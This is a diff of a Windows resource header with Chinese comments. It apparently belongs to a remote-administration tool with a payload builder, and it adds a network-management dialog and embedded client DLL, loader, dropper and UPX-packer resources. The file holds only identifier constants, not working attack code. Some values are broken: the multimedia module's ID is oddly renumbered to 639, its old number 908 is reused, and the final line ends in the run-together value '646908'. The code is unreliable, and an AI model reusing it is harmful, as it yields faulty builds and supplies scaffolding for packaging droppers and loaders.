@@ -13,6 +13,7 @@
 #define IDI_BUILDER     212
 #define IDI_HELP        213
 #define IDI_HISTORY     214
+#define IDI_NETWORK     215
 #ifndef IDC_STATIC
 #define IDC_STATIC      -1
 #endif
@@ -69,6 +70,12 @@
 #define IDM_PROCESS_MODULES  409
 #define IDD_MODULES          410
 #define IDC_LIST_MODULES     411
+
+// 网络管理对话框
+#define IDD_NETWORK          420
+#define IDC_LIST_NETWORK     421
+#define IDC_BTN_NET_REFRESH  422
+#define IDM_NET_REFRESH      423
 
 // 终端管理对话框
 #define IDD_TERMINAL    501
@@ -169,6 +176,7 @@
 #define IDM_SETTINGS     1711
 #define IDM_BUILDER      1712
 #define IDM_HELP         1713
+#define IDM_NETWORK      1714
 
 // 客户端列表右键菜单
 #define IDM_CLIENT_REMARK       1500
@@ -270,6 +278,8 @@
 #define IDC_BTN_FILE_REMOTE_RENAME  2042
 #define IDC_BTN_FILE_REMOTE_DELETE  2043
 #define IDC_BTN_FILE_REMOTE_REFRESH 2044
+#define IDC_STATUS_FILE_BAR         2045
+#define IDC_EDIT_FILE_SEARCH        2046
 // 文件管理右键菜单
 #define IDM_FILE_REFRESH        2020
 #define IDM_FILE_UPLOAD         2021
@@ -312,6 +322,7 @@
 #define IDR_MOD_SERVICE_X86     706
 #define IDR_MOD_REGISTRY_X86    707
 #define IDR_MOD_MULTIMEDIA_X86  708
+#define IDR_MOD_NETWORK_X86     709
 // 二进制资源 (DLL 和 EXE) - x64
 #define IDR_CLIENT_EXE_X64      801
 #define IDR_MOD_PROCESS_X64     901
@@ -321,4 +332,12 @@
 #define IDR_MOD_FILE_X64        905
 #define IDR_MOD_SERVICE_X64     906
 #define IDR_MOD_REGISTRY_X64    907
-#define IDR_MOD_MULTIMEDIA_X64  908
+#define IDR_MOD_MULTIMEDIA_X64  639
+#define IDR_MOD_NETWORK_X64     908
+#define IDR_CLIENT_DLL          640
+#define IDR_CLIENT_DLL_X64      641
+#define IDR_LOADER_EXE          642
+#define IDR_LOADER_EXE_X64      643
+#define IDR_DROPPER_EXE         644
+#define IDR_DROPPER_EXE_X64     645
+#define IDR_UPX_EXE             646908
